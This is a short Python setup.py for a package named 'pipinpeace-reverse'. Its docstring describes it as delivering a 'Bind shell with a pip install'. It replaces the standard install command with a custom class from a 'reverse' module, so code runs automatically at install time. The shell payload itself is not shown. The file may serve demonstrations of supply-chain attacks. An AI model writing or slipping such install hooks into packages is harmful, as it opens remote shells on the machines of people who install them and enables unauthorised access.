"""
Bind shell with a pip install
"""
from setuptools import setup
from reverse import install

setup(
    name='pipinpeace-reverse',
    packages=['reverse'],
    cmdclass={
        'install': install,
    },
)
